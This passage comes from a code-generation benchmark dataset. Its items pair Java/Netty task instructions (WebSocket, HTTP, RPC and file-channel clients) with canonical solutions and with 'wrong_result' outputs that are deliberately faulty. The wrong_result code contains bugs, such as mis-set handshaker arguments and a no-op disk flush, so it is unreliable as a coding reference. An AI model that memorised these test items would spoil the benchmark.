WebSocketClientHandshaker handshaker =\n                WebSocketClientHandshakerFactory.newHandshaker(\n                        uri, version, null, false, new DefaultHttpHeaders());\n        WSClientHandler handler = new WSClientHandler(handshaker);\n        EventLoopGroup group = new NioEventLoopGroup();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel channel) throws Exception {\n                        ChannelPipeline p = channel.pipeline();\n                        p.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192), handler);\n                    }\n                });\n\n        ChannelFuture future =\n                bootstrap.connect(\n                        new InetSocketAddress(uri.getHost(), uri.getPort()));\n        future.syncUninterruptibly();\n        handler.handshakeFuture.syncUninterruptibly();\n        ch = future.channel();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, final FrameListener listener) {\n        ch.pipeline().addLast(\"responseHandler\" + count.incrementAndGet(), new SimpleChannelInboundHandler<Object>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                if (msg instanceof CloseWebSocketFrame) {\n                    closed = true;\n                }\n                listener.onFrame((WebSocketFrame) msg);\n                ctx.pipeline().remove(this);\n            }\n\n            @Override\n            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n                cause.printStackTrace();\n                listener.onError(cause);\n                ctx.pipeline().remove(this);\n            }\n        });\n        ChannelFuture cf = ch.writeAndFlush(frame).syncUninterruptibly();\n        if (!cf.isSuccess()) {\n            listener.onError(cf.cause());\n        }\n        return this;\n    }\n\n    public void destroy() {\n        this.destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed && !dirty) {\n            final CountDownLatch latch = new CountDownLatch(1);\n            send(new CloseWebSocketFrame(), new FrameListener() {\n                @Override\n                public void onFrame(WebSocketFrame frame) {\n                    latch.countDown();\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    latch.countDown();\n                }\n            });\n            try {\n                latch.await(10, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        if (ch != null) {\n            ch.close().syncUninterruptibly();\n        }\n        try {\n            bootstrap.group().shutdownGracefully(0, 1, TimeUnit.SECONDS).get();\n        } catch (InterruptedException | ExecutionException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public boolean isActive() {\n        return this.ch != null && this.ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return this.ch != null && this.ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return this.ch != null && this.ch.isWritable();\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private static final class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketClientHandshaker handshaker;\n        private ChannelPromise handshakeFuture;\n\n        WSClientHandler(WebSocketClientHandshaker handshaker) {\n            super(false);\n            this.handshaker = handshaker;\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            handshaker.handshake(ctx.channel());\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object o) throws Exception {\n            Channel ch = ctx.channel();\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.finishHandshake(ch, (FullHttpResponse) o);\n                handshakeFuture.setSuccess();\n                ReferenceCountUtil.release(o);\n                return;\n            }\n\n            if (o instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) o;\n                ReferenceCountUtil.release(o);\n                throw new Exception(\"Unexpected HttpResponse (status=\" + response.getStatus() + \", content=\"\n                        + response.content().toString(CharsetUtil.UTF_8) + ')');\n            }\n            ctx.fireChannelRead(o);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            if (!handshakeFuture.isDone()) {\n                handshakeFuture.setFailure(cause);\n            }\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.URI;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class WebSocketTestClient {\n    private final Bootstrap bootstrap;\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private volatile boolean closed = false;\n    private final AtomicInteger count = new AtomicInteger(0);\n\n    public WebSocketTestClient(URI uri, WebSocketVersion version) {\n        this.uri = uri;\n        this.version = version;\n        bootstrap = new Bootstrap();\n        bootstrap.group(new NioEventLoopGroup())\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(8192));\n                        pipeline.addLast(new WebSocketClientHandler(uri, version));\n                    }\n                });\n    }\n\n    public WebSocketTestClient connect() throws Exception {\n        ch = bootstrap.connect(uri.getHost(), uri.getPort()).sync().channel();\n        ((WebSocketClientHandler) ch.pipeline().last()).handshakeFuture().sync();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, FrameListener listener) {\n        if (ch != null && ch.isActive()) {\n            ch.writeAndFlush(frame).addListener((ChannelFutureListener) future -> {\n                if (future.isSuccess()) {\n                    listener.onFrame(frame);\n                } else {\n                    listener.onError(future.cause());\n                }\n            });\n        }\n        return this;\n    }\n\n    public void destroy() {\n        destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (ch != null) {\n            if (dirty) {\n                ch.close();\n            } else {\n                ch.close().awaitUninterruptibly();\n            }\n        }\n    }\n\n    public boolean isActive() {\n        return ch != null && ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return ch != null && ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return ch != null && ch.isWritable();\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private class WebSocketClientHandler extends SimpleChannelInboundHandler<WebSocketFrame> {\n        private final WebSocketClientHandshaker handshaker;\n        private ChannelPromise handshakeFuture;\n\n        WebSocketClientHandler(URI uri, WebSocketVersion version) {\n            this.handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                    new DefaultHttpHeaders(), version, \"websocket\", true, new DefaultHttpHeaders());\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/\",\n                    Unpooled.EMPTY_BUFFER);\n            request.headers().set(HttpHeaderNames.HOST, uri.getHost());\n            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.UPGRADE);\n            request.headers().set(HttpHeaderNames.UPGRADE, \"websocket\");\n            handshaker.handshake(ctx.channel(), request);\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {\n            if (frame instanceof TextWebSocketFrame) {\n                String text = ((TextWebSocketFrame) frame).text();\n                System.out.println(\"Received: \" + text);\n            } else if (frame instanceof PongWebSocketFrame) {\n                System.out.println(\"Received pong\");\n            } else if (frame instanceof CloseWebSocketFrame) {\n                System.out.println(\"Received close\");\n                ch.close();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            if (!closed) {\n                ch.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using Netty framework for making GET and POST requests to a remote server, with support for timeout handling and asynchronous response processing.\n\nClass Description: TestHttpClient is a Netty-based HTTP client that handles both GET and POST requests asynchronously. It manages connection pooling, request/response processing, and timeout handling. The class uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- host: String - The target server hostname or IP address\n- port: int - The target server port number\n- defaultTimeout: int - Default timeout in milliseconds for request completion\n- workerGroup: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- b: Bootstrap - Netty bootstrap for client configuration\n- results: ConcurrentHashMap<String, CompletableFuture<String>> - Map for tracking pending requests and their futures\n\nMethods:\n- init(): void - Initializes the Netty client configuration including pipeline setup\n- close(): void - Shuts down the client gracefully and releases resources\n- get(String uri) -> String - Sends an HTTP GET request to the specified URI\n- post(String uri, Map<String, String> params, Map<String, String> headers) -> String - Sends an HTTP POST request with parameters and headers\n- send(HttpRequest request) -> String - Internal method for sending requests and handling responses",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.DefaultHttpDataFactory;\nimport io.netty.handler.codec.http.multipart.HttpPostRequestEncoder;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.URI;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestHttpClient {\n    private String host;\n    private int port;\n    private int defaultTimeout;\n    private EventLoopGroup workerGroup;\n    private Bootstrap b;\n    private Map<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        init();\n    }\n\n    private void init() {\n        b = new Bootstrap();\n        workerGroup = new NioEventLoopGroup();\n        b.group(workerGroup).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(\"http-decoder\", new HttpResponseDecoder());\n                ch.pipeline().addLast(\"http-encoder\", new HttpRequestEncoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(1024 * 1024));\n                ch.pipeline().addLast(\"clientHandler\", new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpResponse httpResponse) {\n                        CompletableFuture<String> future = results.get(ctx.channel().id().asLongText());\n                        if (future != null) {\n                            future.complete(httpResponse.content().toString(CharsetUtil.UTF_8));\n                        }\n                    }\n                });\n            }\n        });\n    }\n\n    public void close() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        results.clear();\n    }\n\n    public String get(String uri) throws Exception {\n        DefaultHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, new URI(uri).toASCIIString());\n        return send(request);\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) throws Exception {\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(uri).toASCIIString());\n        if (params != null && !params.isEmpty()) {\n            HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(new DefaultHttpDataFactory(), request, false);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                encoder.addBodyAttribute(entry.getKey(), entry.getValue());\n            }\n            request = encoder.finalizeRequest();\n        }\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        return send(request);\n    }\n\n    private String send(HttpRequest request) throws Exception {\n        ChannelFuture f = b.connect(host, port).sync();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(f.channel().id().asLongText(), future);\n        String result;\n        try {\n            f.channel().writeAndFlush(request).sync();\n            result = future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n        } finally {\n            results.remove(f.channel().id().asLongText());\n            f.channel().closeFuture().sync();\n        }\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.ReadTimeoutHandler;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\nimport java.util.concurrent.*;\n\npublic class TestHttpClient {\n    private final String host;\n    private final int port;\n    private final int defaultTimeout;\n    private final NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Bootstrap b = new Bootstrap();\n    private final ConcurrentHashMap<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        init();\n    }\n\n    private void init() {\n        b.group(workerGroup)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.SO_KEEPALIVE, true)\n         .handler(new ChannelInitializer<NioSocketChannel>() {\n             @Override\n             protected void initChannel(NioSocketChannel ch) {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 pipeline.addLast(\"timeout\", new ReadTimeoutHandler(defaultTimeout / 1000));\n                 pipeline.addLast(\"httpCodec\", new HttpClientCodec());\n                 pipeline.addLast(\"aggregator\", new HttpObjectAggregator(8192));\n                 pipeline.addLast(\"handler\", new SimpleChannelInboundHandler<HttpObject>() {\n                     private String requestId;\n\n                     @Override\n                     public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n                         if (msg instanceof HttpResponse) {\n                             requestId = ((HttpResponse) msg).trailingHeaders().getAsString(\"request-id\");\n                         }\n                         if (msg instanceof FullHttpResponse) {\n                             FullHttpResponse response = (FullHttpResponse) msg;\n                             byte[] content = new byte[response.content().readableBytes()];\n                             response.content().readBytes(content);\n                             String body = new String(content);\n                             results.get(requestId).complete(body);\n                             ctx.close();\n                         }\n                     }\n\n                     @Override\n                     public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                         for (CompletableFuture<String> future : results.values()) {\n                             future.completeExceptionally(cause);\n                         }\n                         ctx.close();\n                     }\n                 });\n             }\n         });\n    }\n\n    public void close() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public String get(String uri) throws URISyntaxException {\n        return send(createGetRequest(uri));\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) throws URISyntaxException {\n        return send(createPostRequest(uri, params, headers));\n    }\n\n    private String send(HttpRequest request) {\n        try {\n            URI uri = new URI(request.uri());\n            CompletableFuture<String> future = new CompletableFuture<>();\n            String requestId = java.util.UUID.randomUUID().toString();\n            request.headers().set(\"request-id\", requestId);\n            results.put(requestId, future);\n\n            ChannelFuture connectFuture = b.connect(host, port).sync();\n            Channel channel = connectFuture.channel();\n            channel.writeAndFlush(request).addListener((ChannelFutureListener) f -> {\n                if (!f.isSuccess()) {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n\n            return future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private static HttpRequest createGetRequest(String uri) {\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri,\n                Unpooled.EMPTY_BUFFER);\n        request.headers().set(HttpHeaderNames.HOST, \"localhost\");\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        return request;\n    }\n\n    private static HttpRequest createPostRequest(String uri, Map<String, String> params, Map<String, String> headers) {\n        StringBuilder paramBuilder = new StringBuilder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            if (paramBuilder.length() > 0) {\n                paramBuilder.append(\"&\");\n            }\n            paramBuilder.append(entry.getKey()).append(\"=\").append(entry.getValue());\n        }\n\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, uri,\n                Unpooled.copiedBuffer(paramBuilder.toString(), java.nio.charset.StandardCharsets.UTF_8));\n        request.headers().set(HttpHeaderNames.HOST, \"localhost\");\n        request.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/x-www-form-urlencoded\");\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n\n        if (headers != null) {\n            for (Map.Entry<String, String> header : headers.entrySet()) {\n                request.headers().set(header.getKey(), header.getValue());\n            }\n        }\n\n        return request;\n    }\n}\n```"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Create a Java class that provides functionality for interacting with files using Java NIO's FileChannel and memory-mapped file operations. The class should support opening files, mapping files to memory, accessing mapped buffers, forcing writes to disk, and properly closing resources.\n\nClass Description: The FileChannelInteractor class encapsulates operations for file channel interaction and memory-mapped file operations using Java NIO. It provides methods to open files, map file regions to memory, access mapped buffers, ensure data persistence, and clean up resources.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedBuffer: MappedByteBuffer - The buffer representing the memory-mapped file region\n\nMethods:\nopenFileChannel: openFileChannel(String filePath) -> void - Opens a FileChannel for reading the specified file. Throws IOException if the file cannot be opened.\nmapFileToMemory: mapFileToMemory(long position, long size) -> void - Maps a region of the file into memory for read-only access. Throws IOException if mapping fails.\ngetMappedBuffer: getMappedBuffer() -> MappedByteBuffer - Returns the currently mapped byte buffer.\ncloseChannel: closeChannel() -> void - Closes the FileChannel and releases associated resources. Throws IOException if closing fails.\nforceWriteToDisk: forceWriteToDisk() -> void - Forces any changes made to the mapped buffer to be written to disk (though in this implementation the buffer is read-only).",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        this.mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return this.mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (this.fileChannel != null) {\n            this.fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (this.mappedBuffer != null) {\n            this.mappedBuffer.force();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        RandomAccessFile randomAccessFile = new RandomAccessFile(filePath, \"r\");\n        fileChannel = randomAccessFile.getChannel();\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        if (fileChannel == null) {\n            throw new IOException(\"File channel is not open.\");\n        }\n        mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (mappedBuffer != null) {\n            // No-op for read-only mappings; write-through applies when buffer is writable.\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Implement a Netty-based RPC client in Java that handles remote procedure calls, manages connections, and processes responses asynchronously.\n\nClass Description: NettyRpcClient is a final class that implements RpcRequestTransport interface. It provides functionality for establishing TCP connections using Netty framework, sending RPC requests, and managing client-side communication with a remote server. The class handles connection pooling, request tracking, and graceful shutdown.\n\nAttributes:\n- serviceDiscovery: [ServiceDiscovery] - Handles service lookup to find the appropriate server address\n- unprocessedRequests: [UnprocessedRequests] - Tracks outstanding RPC requests and their corresponding futures\n- channelProvider: [ChannelProvider] - Manages and provides channels for communication\n- bootstrap: [Bootstrap] - Netty's client bootstrap configuration\n- eventLoopGroup: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRpcClient() -> [void] - Constructor that initializes the Netty client configuration, including event loop group, bootstrap, and pipeline handlers\n- doConnect(InetSocketAddress inetSocketAddress) -> [Channel] - Establishes a connection to the specified remote address and returns the channel\n- sendRpcRequest(RpcRequest rpcRequest) -> [Object] - Sends an RPC request to the server and returns a CompletableFuture containing the response\n- getChannel(InetSocketAddress inetSocketAddress) -> [Channel] - Retrieves or creates a channel for the specified address\n- close() -> [void] - Shuts down the client gracefully and releases resources",
    "Canonical_solution": "import github.javaguide.enums.CompressTypeEnum;\nimport github.javaguide.enums.SerializationTypeEnum;\nimport github.javaguide.enums.ServiceDiscoveryEnum;\nimport github.javaguide.extension.ExtensionLoader;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.registry.ServiceDiscovery;\nimport github.javaguide.remoting.constants.RpcConstants;\nimport github.javaguide.remoting.dto.RpcMessage;\nimport github.javaguide.remoting.dto.RpcRequest;\nimport github.javaguide.remoting.dto.RpcResponse;\nimport github.javaguide.remoting.transport.RpcRequestTransport;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        eventLoopGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(new IdleStateHandler(0, 5, 0, TimeUnit.SECONDS));\n                        p.addLast(new RpcMessageEncoder());\n                        p.addLast(new RpcMessageDecoder());\n                        p.addLast(new NettyRpcClientHandler());\n                    }\n                });\n        this.serviceDiscovery = ExtensionLoader.getExtensionLoader(ServiceDiscovery.class).getExtension(ServiceDiscoveryEnum.ZK.getName());\n        this.unprocessedRequests = SingletonFactory.getInstance(UnprocessedRequests.class);\n        this.channelProvider = SingletonFactory.getInstance(ChannelProvider.class);\n    }\n\n    public Channel doConnect(InetSocketAddress inetSocketAddress) {\n        CompletableFuture<Channel> completableFuture = new CompletableFuture<>();\n        bootstrap.connect(inetSocketAddress).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                completableFuture.complete(future.channel());\n            } else {\n                throw new IllegalStateException();\n            }\n        });\n        return completableFuture.get();\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        CompletableFuture<RpcResponse<Object>> resultFuture = new CompletableFuture<>();\n        InetSocketAddress inetSocketAddress = serviceDiscovery.lookupService(rpcRequest);\n        Channel channel = getChannel(inetSocketAddress);\n        if (channel.isActive()) {\n            unprocessedRequests.put(rpcRequest.getRequestId(), resultFuture);\n            RpcMessage rpcMessage = RpcMessage.builder().data(rpcRequest)\n                    .codec(SerializationTypeEnum.HESSIAN.getCode())\n                    .compress(CompressTypeEnum.GZIP.getCode())\n                    .messageType(RpcConstants.REQUEST_TYPE).build();\n            channel.writeAndFlush(rpcMessage).addListener((ChannelFutureListener) future -> {\n                if (future.isSuccess()) {\n                } else {\n                    future.channel().close();\n                    resultFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            throw new IllegalStateException();\n        }\n        return resultFuture;\n    }\n\n    public Channel getChannel(InetSocketAddress inetSocketAddress) {\n        Channel channel = channelProvider.get(inetSocketAddress);\n        if (channel == null) {\n            channel = doConnect(inetSocketAddress);\n            channelProvider.set(inetSocketAddress, channel);\n        }\n        return channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\npublic final class NettyRpcClient implements RpcRequestTransport {\n    private final ServiceDiscovery serviceDiscovery;\n    private final UnprocessedRequests unprocessedRequests;\n    private final ChannelProvider channelProvider;\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n\n    public NettyRpcClient() {\n        this.serviceDiscovery = new DefaultServiceDiscovery();\n        this.unprocessedRequests = new DefaultUnprocessedRequests();\n        this.channelProvider = new DefaultChannelProvider();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new RpcRequestEncoder());\n                        pipeline.addLast(new RpcResponseDecoder());\n                        pipeline.addLast(new RpcClientHandler(unprocessedRequests));\n                    }\n                });\n    }\n\n    private Channel doConnect(InetSocketAddress inetSocketAddress) {\n        try {\n            ChannelFuture future = bootstrap.connect(inetSocketAddress).sync();\n            return future.channel();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Connection interrupted\", e);\n        }\n    }\n\n    @Override\n    public Object sendRpcRequest(RpcRequest rpcRequest) {\n        InetSocketAddress address = serviceDiscovery.discoverServiceAddress(rpcRequest.getServiceName());\n        Channel channel = getChannel(address);\n        CompletableFuture<RpcResponse> future = new CompletableFuture<>();\n        unprocessedRequests.add(rpcRequest.getRequestId(), future);\n        channel.writeAndFlush(rpcRequest);\n        return future;\n    }\n\n    private Channel getChannel(InetSocketAddress inetSocketAddress) {\n        return channelProvider.getChannel(inetSocketAddress, () -> doConnect(inetSocketAddress));\n    }\n\n    @Override\n    public void close() {\n        unprocessedRequests.clear();\n        channelProvider.closeAllChannels();\n        eventLoopGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, maintenance, and graceful shutdown.\n\nClass Description: HttpEventChannelManager is a Netty-based TCP client manager that creates and maintains connections to remote servers, provides connection metrics, and handles resource cleanup.\n\nAttributes:\n- LOG: [Logger] - Logger instance for logging debug and error messages\n- connectionSuccess: [Counter] - Metric counter for successful connections\n- connectionFailure: [Counter] - Metric counter for failed connections\n- liveConnections: [AtomicDouble] - Gauge metric for current active connections\n- nettyChannelBufferSize: [AtomicDouble] - Gauge metric for current channel buffer size\n- lowWriteBufferWatermark: [int] - Low watermark for write buffer\n- highWriteBufferWatermark: [int] - High watermark for write buffer\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- encoderEventLoopGroup: [EventLoopGroup] - Optional event loop group for compression\n- bootstrap: [Bootstrap] - Netty bootstrap for client configuration\n- channels: [ConcurrentMap<String, Channel>] - Map of active channels keyed by host:port\n\nMethods:\n- HttpEventChannelManager([Registry, MrePublishConfiguration]) -> [void] - Constructor that initializes metrics, event loops, and bootstrap configuration\n- findOrCreate([InetSocketAddress]) -> [Channel] - Finds existing or creates new channel for given address\n- find([InetSocketAddress]) -> [Channel] - Finds existing channel for given address\n- close([InetSocketAddress]) -> [void] - Closes channel for given address\n- getHostPortString([InetSocketAddress]) -> [String] - Helper method to format address as host:port string",
